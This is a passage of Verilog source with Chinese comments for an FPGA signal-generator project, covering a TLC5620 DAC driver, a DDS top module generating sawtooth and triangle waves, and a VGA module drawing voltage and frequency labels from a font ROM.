&lt;= 0; end else begin if(tick_140ns) begin // 生成SCK信号 case(da_ref_cnt) 2,6,10,14,18,22,26,30,34,38,42: SCK &lt;= 1; 4,8,12,16,20,24,28,32,36,40,44: SCK &lt;= 0; default : ; // 缺省不操作 endcase // 生成LOAD信号 case(da_ref_cnt) 0: LOAD &lt;= 1; 46: LOAD &lt;= 0; default : ; // 缺省不操作 endcase // 送入串型数据 case(da_ref_cnt) 3,4: SDI &lt;= da_sel_cnt[1]; 7,8: SDI &lt;= da_sel_cnt[0]; 11,12: SDI &lt;= da_range; 15,16: SDI &lt;= da_data[7]; 19,20: SDI &lt;= da_data[6]; 23,24: SDI &lt;= da_data[5]; 27,28: SDI &lt;= da_data[4]; 31,32: SDI &lt;= da_data[3]; 35,36: SDI &lt;= da_data[2]; 39,40: SDI &lt;= da_data[1]; 43,44: SDI &lt;= da_data[0]; default : SDI &lt;= 1&#x27;b1; endcase end end endmodule top_dds.vmodule top_dds ( input wire sys_clk , // 系统时钟,50MHz input wire sys_rst_n , // 复位信号,低电平有效 input wire [3:0] key , // 输入4位按键 input key_add , // 减少脉冲频率按键 input key_low , // 增加脉冲频率按键 // TLC5620的引脚 output wire da_clk , // 时钟信号 output wire da_data , // 数据信号 output wire da_ldac , // LDAC信号 output wire da_load // LOAD信号 ); // 定义计数器的最大值 reg [15:0] counter = 16&#x27;d999; // 初始值 // 消抖后的按键状态 wire key_add_flag; wire key_low_flag; // 消抖后的按键状态 parameter CNT_MAX = 20&#x27;d999_999; //计数器计数最大值 always @(posedge sys_clk or negedge sys_rst_n) begin if (!sys_rst_n) begin // 当复位信号为低时，重置计数器和步进信号 counter &lt;= 16&#x27;d999; end else begin // 根据按键状态调整counter的值 if (!key_add_flag) begin counter &lt;= counter + 16&#x27;d100; end else if (!key_low_flag) begin counter &lt;= counter - 16&#x27;d100; end end end /************************************** * 生成20ms的tick时钟 **************************************/ reg [15:0] cnt_20ms; always@(posedge sys_clk, negedge sys_rst_n) if(!sys_rst_n) cnt_20ms &lt;= 0; else begin if(cnt_20ms &lt; 16&#x27;d999) cnt_20ms &lt;= cnt_20ms + 1&#x27;b1; else cnt_20ms &lt;= 0; end wire tick_20ms = (cnt_20ms == 16&#x27;d999) ? 1 : 0; //********************************************************************// //****************** Parameter and Internal Signal *******************// //********************************************************************// //wire define wire [3:0] wave_select ; // 波形选择 wire [7:0] dac_data ; // 输入DAC模块波形数据 /************************************** * 锯齿波； **************************************/ reg [7:0] da0_data; always@(posedge sys_clk, negedge sys_rst_n) if(!sys_rst_n) da0_data &lt;= 0; else if(tick_20ms) begin if(da0_data &lt; 126) da0_data &lt;= da0_data + 1&#x27;b1; else da0_data &lt;= 0; end /************************************** * 三角波； **************************************/ reg da1_highest_level_flag; reg [7:0] da1_data; always@(posedge sys_clk, negedge sys_rst_n) if(!sys_rst_n) begin da1_data &lt;= 0; da1_highest_level_flag &lt;= 0; end else if(tick_20ms) begin if(da1_data == 126) da1_highest_level_flag &lt;= 1; else if(da1_data == 0) da1_highest_level_flag &lt;= 0; if(da1_highest_level_flag) da1_data &lt;= da1_data - 1&#x27;b1; else da1_data &lt;= da1_data + 1&#x27;b1; end //********************************************************************// //*************************** Instantiation **************************// //********************************************************************// //-------------------------- dds_inst ----------------------------- dds dds_inst ( .sys_clk (sys_clk ), // 系统时钟,50MHz .sys_rst_n (sys_rst_n ), // 复位信号,低电平有效 .wave_select (wave_select), // 输出波形选择 .data_out (dac_data ) // 波形输出 ); //----------------------- key_control_inst ------------------------ key_control key_control_inst ( .sys_clk (sys_clk ), // 系统时钟,50MHz .sys_rst_n (sys_rst_n ), // 复位信号,低电平有效 .key (key ), // 输入4位按键 .wave_select (wave_select) // 输出波形选择 ); //----------------------- tlc5620_driver_inst ------------------------ tlc5620_driver tlc5620_driver_inst ( .CLOCK_50(sys_clk), // 系统时钟 .RST_N(sys_rst_n), // 复位信号 .da_enable(1&#x27;b1), // 使能信号，始终使能 .da_range(1&#x27;b0), // 输出范围选择，根据需要设置 .da0_data(dac_data), // 将dac_data连接到DA0通道 .da1_data(da0_data), // 其他通道暂时不使用，置为0 .da2_data(da1_data), // 其他通道暂时不使用，置为0 .da3_data(8&#x27;b0), // 其他通道暂时不使用，置为0 .SCK(da_clk), // 连接到外部引脚 .SDI(da_data), // 连接到外部引脚 .LOAD(da_load) // 连接到外部引脚 ); // TLC5620的LDAC信号通常需要保持低电平以更新输出电压 assign da_ldac = 1&#x27;b0; //------------- key_low -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst5 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key_low ) , //按键输入信号 .key_flag (key_low_flag ) //按键消抖后标志信号 ); //------------- key_add -------------- key_filter #( .CNT_MAX (CNT_MAX ) //计数器计数最大值 ) key_filter_inst4 ( .sys_clk (sys_clk ) , //系统时钟50Mhz .sys_rst_n (sys_rst_n) , //全局复位 .key_in (key_add ) , //按键输入信号 .key_flag (key_add_flag ) //按键消抖后标志信号 ); endmodule Vga_Module.v//--------------------------------------------------------------------------- //-- 文件名 :\tA4_Vga.v //-- 作者 :\tZIRCON //-- 描述 :\tVGA显示彩条 //-- 修订历史\t:\t2014-1-1 //--------------------------------------------------------------------------- //--------------------------------------------------------------------------- //-- VGA 800*600@60 //-- VGA_DATA[7:0] red2,red1,red0,green2,green1,green0,blue1,blue0 //-- VGA CLOCK 40MHz. //--------------------------------------------------------------------------- //--------------------------------------------------------------------------- //-- Horizonal timing information //-- Sync pluse 128 a //-- back porch 88 b //-- active 800 c //-- front porch 40 d //-- All line 1056 e //-- Vertical timing information //-- sync pluse 4 o //-- back porch 23 p //-- active time 600 q //-- front porch 1 r //-- All lines 628 s //--------------------------------------------------------------------------- //--------------------------------------------------------------------------- //-- Horizonal timing information `define HSYNC_A 16&#x27;d128 // 128 `define HSYNC_B 16&#x27;d216 // 128 + 88 `define HSYNC_C 16&#x27;d1016 // 128 + 88 + 800 `define HSYNC_D 16&#x27;d1056 // 128 + 88 + 800 + 40 //-- Vertical timing information `define VSYNC_O 16&#x27;d4 // 4 `define VSYNC_P 16&#x27;d27 // 4 + 23 `define VSYNC_Q 16&#x27;d627 // 4 + 23 + 600 `define VSYNC_R 16&#x27;d628 // 4 + 23 + 600 + 1 //--------------------------------------------------------------------------- module Vga_Module ( //输入端口 CLK_40M,RST_N,vga_freq,vga_fengzhi, //输出端口 VSYNC,HSYNC,VGA_DATA,vga_x,vga_y,ad_to_vga_data ); //--------------------------------------------------------------------------- //-- 外部端口声明 //--------------------------------------------------------------------------- input CLK_40M; //时钟的端口 input RST_N; //复位的端口,低电平复位 input [7:0] ad_to_vga_data; //VGA中显示的波形数据 input [31:0]\tvga_freq; //VGA中显示的频率值 input [31:0] vga_fengzhi; //VGA中显示的峰峰值 output VSYNC; //VGA垂直同步端口 output HSYNC; //VGA水平同步端口 output [ 7:0]\tVGA_DATA; //VGA数据端口 output [15:0] vga_x; //VGA的x坐标 output [15:0] vga_y; //VGA的y坐标 //--------------------------------------------------------------------------- //-- 内部端口声明 //--------------------------------------------------------------------------- reg [15:0] hsync_cnt; //水平扫描计数器 reg [15:0]\thsync_cnt_n; //hsync_cnt的下一个状态 reg [15:0] vsync_cnt; //垂直扫描计数器 reg [15:0] vsync_cnt_n; //vsync_cnt的下一个状态 reg [ 7:0] VGA_DATA; //RGB端口总线 reg [ 7:0] VGA_DATA_N; //VGA_DATA的下一个状态 reg VSYNC; //垂直同步端口 reg VSYNC_N; //VSYNC的下一个状态 reg HSYNC; //水平同步端口 reg HSYNC_N; //HSYNC的下一个状态 reg vga_data_en; //RGB传输使能信号 reg vga_data_en_n; //vga_data_en的下一个状态 wire [15:0] rom_font_data; //字库的数据位 reg [15:0] rom_font_addr; //字库的地址位 reg [15:0] rom_font_addr_n; //rom_font_addr的下一个状态 //--------------------------------------------------------------------------- //-- 逻辑功能实现 //--------------------------------------------------------------------------- //时序电路,用来给hsync_cnt寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 hsync_cnt &lt;= 16&#x27;b0; //初始化hsync_cnt值 else hsync_cnt &lt;= hsync_cnt_n; //用来给hsync_cnt赋值 end //组合电路,水平扫描 always @ (*) begin if(hsync_cnt == `HSYNC_D) //判断水平扫描时序 hsync_cnt_n = 16&#x27;b0; //如果水平扫描完毕,计数器将会被清零 else hsync_cnt_n = hsync_cnt + 1&#x27;b1;\t//如果水平没有扫描完毕,计数器继续累加 end //时序电路,用来给vsync_cnt寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 vsync_cnt &lt;= 16&#x27;b0; //给行扫描赋值 else vsync_cnt &lt;= vsync_cnt_n; //给行扫描赋值 end //组合电路,垂直扫描 always @ (*) begin if((vsync_cnt == `VSYNC_R) &amp;&amp; (hsync_cnt == `HSYNC_D))//判断垂直扫描时序 vsync_cnt_n = 16&#x27;b0; //如果垂直扫描完毕,计数器将会被清零 else if(hsync_cnt == `HSYNC_D) //判断水平扫描时序 vsync_cnt_n = vsync_cnt + 1&#x27;b1;\t//如果水平扫描完毕,计数器继续累加 else vsync_cnt_n = vsync_cnt; //否则,计数器将保持不变 end //时序电路,用来给HSYNC寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 HSYNC &lt;= 1&#x27;b0; //初始化HSYNC值 else HSYNC &lt;= HSYNC_N; //用来给HSYNC赋值 end //组合电路，将HSYNC_A区域置0,HSYNC_B+HSYNC_C+HSYNC_D置1 always @ (*) begin if(hsync_cnt &lt; `HSYNC_A) //判断水平扫描时序 HSYNC_N = 1&#x27;b0; //如果在HSYNC_A区域,那么置0 else HSYNC_N = 1&#x27;b1; //如果不在HSYNC_A区域,那么置1 end //时序电路,用来给VSYNC寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 VSYNC &lt;= 1&#x27;b0; //初始化VSYNC值 else VSYNC &lt;= VSYNC_N; //用来给VSYNC赋值 end //组合电路，将VSYNC_A区域置0,VSYNC_P+VSYNC_Q+VSYNC_R置1 always @ (*) begin if(vsync_cnt &lt; `VSYNC_O) //判断水平扫描时序 VSYNC_N = 1&#x27;b0; //如果在VSYNC_O区域,那么置0 else VSYNC_N = 1&#x27;b1; //如果不在VSYNC_O区域,那么置1 end //时序电路,用来给vga_data_en寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 vga_data_en &lt;= 1&#x27;b0; //初始化vga_data_en值 else vga_data_en &lt;= vga_data_en_n; //用来给vga_data_en赋值 end //组合电路，判断显示有效区（列像素&gt;216&amp;&amp;列像素&lt;1017&amp;&amp;行像素&gt;27&amp;&amp;行像素&lt;627） always @ (*) begin if((hsync_cnt &gt; `HSYNC_B &amp;&amp; hsync_cnt &lt;`HSYNC_C) &amp;&amp; (vsync_cnt &gt; `VSYNC_P &amp;&amp; vsync_cnt &lt; `VSYNC_Q)) vga_data_en_n = 1&#x27;b1; //如果在显示区域就给使能数据信号置1 else vga_data_en_n = 1&#x27;b0; //如果不在显示区域就给使能数据信号置0 end //时序电路,用来给VGA_DATA寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) //判断复位 VGA_DATA &lt;= 8&#x27;h0; //初始化VGA_DATA值 else VGA_DATA &lt;= VGA_DATA_N; //用来给VGA_DATA赋值 end //例化ROM字库模块 ROM_Font_Module ROM_Font_Init ( .address (rom_font_addr ), //字库的地址位 .clock (CLK_40M ), //字库的时钟 .q (rom_font_data ) //字库的数据位 ); //判断数字显示的位置 assign rom_5v_en = (vga_y &gt;= 10&#x27;d90) &amp;&amp; (vga_y &lt;= 10&#x27;d106) &amp;&amp; (vga_x &gt;= 10&#x27;d98) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_4_375v_en = (vga_y &gt;= 10&#x27;d122) &amp;&amp; (vga_y &lt;= 10&#x27;d138) &amp;&amp; (vga_x &gt;= 10&#x27;d66) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_3_75v_en = (vga_y &gt;= 10&#x27;d154) &amp;&amp; (vga_y &lt;= 10&#x27;d170) &amp;&amp; (vga_x &gt;= 10&#x27;d74) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_3_125v_en = (vga_y &gt;= 10&#x27;d186) &amp;&amp; (vga_y &lt;= 10&#x27;d203) &amp;&amp; (vga_x &gt;= 10&#x27;d66) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_2_5v_en = (vga_y &gt;= 10&#x27;d218) &amp;&amp; (vga_y &lt;= 10&#x27;d234) &amp;&amp; (vga_x &gt;= 10&#x27;d82) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_1_875v_en = (vga_y &gt;= 10&#x27;d250) &amp;&amp; (vga_y &lt;= 10&#x27;d266) &amp;&amp; (vga_x &gt;= 10&#x27;d66) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_1_25v_en = (vga_y &gt;= 10&#x27;d282) &amp;&amp; (vga_y &lt;= 10&#x27;d298) &amp;&amp; (vga_x &gt;= 10&#x27;d74) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_0_625v_en = (vga_y &gt;= 10&#x27;d314) &amp;&amp; (vga_y &lt;= 10&#x27;d330) &amp;&amp; (vga_x &gt;= 10&#x27;d66) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_0v_en = (vga_y &gt;= 10&#x27;d346) &amp;&amp; (vga_y &lt;= 10&#x27;d362) &amp;&amp; (vga_x &gt;= 10&#x27;d98) &amp;&amp; (vga_x &lt;= 10&#x27;d116); assign rom_pinlv_en = (vga_y &gt; 10&#x27;d490) &amp;&amp; (vga_y &lt; 10&#x27;d507) &amp;&amp; (vga_x &gt;= 10&#x27;d130) &amp;&amp; (vga_x &lt;= 10&#x27;d176); assign rom_500hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d220); assign rom_333hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d220); assign rom_833hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d220); assign rom_166hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d220); assign rom_666hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d220); assign rom_1khz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d212); assign rom_2000hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d214); assign rom_1833hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d230); assign rom_1666hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d230); assign rom_1500hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d230); assign rom_1333hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d230); assign rom_1166hz_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d180) &amp;&amp; (vga_x &lt;= 10&#x27;d230); assign rom_26v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_25v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_24v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_23v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_22v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_21v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_20v_en = (vga_y &gt;= 10&#x27;d490) &amp;&amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d516); assign rom_fengzhi_0v_en = (vga_y &gt;= 10&#x27;d490) &amp; (vga_y &lt;= 10&#x27;d506) &amp;&amp; (vga_x &gt;= 10&#x27;d482) &amp; (vga_x &lt;= 10&#x27;d500); assign rom_fengzhi_en = (vga_y &gt;= 10&#x27;d490) &amp; (vga_y &lt;= 10&#x27;d506) &amp; (vga_x &gt;= 10&#x27;d416) &amp; (vga_x &lt;= 10&#x27;d482); //时序电路,用来给rom_font_addr寄存器赋值 always @ (posedge CLK_40M or negedge RST_N) begin if(!RST_N) rom_font_addr &lt;= 8&#x27;d0; else rom_font_addr &lt;= rom_font_addr_n; end //组合电路,用于生成字库的地址位 always @ (*) begin if(rom_5v_en) begin if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_4_375v_en) begin if(vga_x == 10&#x27;d66) rom_font_addr_n = 8&#x27;h20; else if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h38; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_3_75v_en) begin if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h38; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_3_125v_en) begin if(vga_x == 10&#x27;d66) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_2_5v_en) begin if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1_875v_en) begin if(vga_x == 10&#x27;d66) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h40; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h38; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1_25v_en) begin if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_0_625v_en) begin if(vga_x == 10&#x27;d66) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d74) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d82) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d90) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_0v_en) begin if(vga_x == 10&#x27;d98) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d106) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_166hz_en &amp;&amp; (vga_freq == 10&#x27;d166)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_333hz_en &amp;&amp; (vga_freq == 10&#x27;d333)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_500hz_en &amp;&amp; (vga_freq == 10&#x27;d500)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h28; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_666hz_en &amp;&amp; (vga_freq == 10&#x27;d666)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_833hz_en &amp;&amp; (vga_freq == 10&#x27;d833)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h40; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1khz_en &amp;&amp; (vga_freq == 10&#x27;d1000)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 12&#x27;h0a0; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1166hz_en &amp;&amp; (vga_freq == 32&#x27;d1166)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 10&#x27;h8; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d220) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1333hz_en &amp;&amp; (vga_freq == 32&#x27;d1333)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 10&#x27;h18; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d220) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1500hz_en &amp;&amp; (vga_freq == 32&#x27;d1500)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 10&#x27;h28; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h0; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d220) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1666hz_en &amp;&amp; (vga_freq == 32&#x27;d1666)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 10&#x27;h30; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d220) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_1833hz_en &amp;&amp; (vga_freq == 32&#x27;d1833)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h8; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 10&#x27;h40; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h18; else if(vga_x == 10&#x27;d212) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d220) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if(rom_2000hz_en &amp;&amp; (vga_freq == 32&#x27;d2000)) begin if(vga_x == 10&#x27;d180) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d188) rom_font_addr_n = 12&#x27;h0a0; else if(vga_x == 10&#x27;d196) rom_font_addr_n = 8&#x27;h90; else if(vga_x == 10&#x27;d204) rom_font_addr_n = 8&#x27;h98; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_26v_en) &amp;&amp; (vga_fengzhi == 10&#x27;d26)) begin if(vga_x == 10&#x27;d482) rom_font_addr_n = 8&#x27;h10; else if(vga_x == 10&#x27;d490) rom_font_addr_n = 8&#x27;h50; else if(vga_x == 10&#x27;d498) rom_font_addr_n = 8&#x27;h30; else if(vga_x == 10&#x27;d506) rom_font_addr_n = 8&#x27;h58; else rom_font_addr_n = rom_font_addr + 1&#x27;b1; end else if((rom_25v_en) &amp;&amp; 